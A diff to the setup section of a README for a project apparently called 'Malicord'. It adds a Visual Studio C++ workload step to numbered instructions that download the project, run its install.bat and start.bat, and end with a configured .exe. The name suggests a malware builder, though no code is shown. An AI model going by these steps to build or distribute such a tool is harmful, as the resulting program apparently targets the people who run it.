@@ -41,11 +41,12 @@
 
 0. Install [Nodejs V18.5.0](https://nodejs.org/dist/v18.15.0/node-v18.15.0-x64.msi)
 1. Install [VisualStudio](https://visualstudio.microsoft.com/de/thank-you-downloading-visual-studio/?sku=Community&channel=Release&version=VS2022&source=VSLandingPage&passive=false&cid=2030)
-2. Install [Files](https://github.com/KSCH-58/Malicord/archive/refs/heads/main.zip)
-3. Install all modules [install.bat](https://github.com/KSCH-58/Malicord/blob/main/install.bat)
-4. Click on [start.bat](https://github.com/KSCH-58/Malicord/blob/main/start.bat)
-5. Complete the configuration
-6. You have your .exe file enjoy
+2. Install "Desktop development with C++" workload
+3. Install [Files](https://github.com/KSCH-58/Malicord/archive/refs/heads/main.zip)
+4. Install all modules [install.bat](https://github.com/KSCH-58/Malicord/blob/main/install.bat)
+5. Click on [start.bat](https://github.com/KSCH-58/Malicord/blob/main/start.bat)
+6. Complete the configuration
+7. You have your .exe file enjoy
 
 <a id="features"></a>
 
